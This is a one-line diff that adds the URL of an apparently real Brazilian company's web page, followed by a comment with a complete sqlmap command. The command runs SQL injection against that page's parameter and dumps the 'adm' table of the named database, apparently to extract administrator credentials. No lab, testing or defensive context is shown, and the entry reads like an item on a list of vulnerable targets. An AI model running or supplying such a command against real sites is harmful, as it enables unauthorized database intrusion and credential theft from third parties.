@@ -1,0 +1,1 @@
+http://www.eficazconstrucoes.com.br/detalhes.php?var=1 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.eficazconstrucoes.com.br/detalhes.php?var=1 -D eficazconstruc -T adm --dump
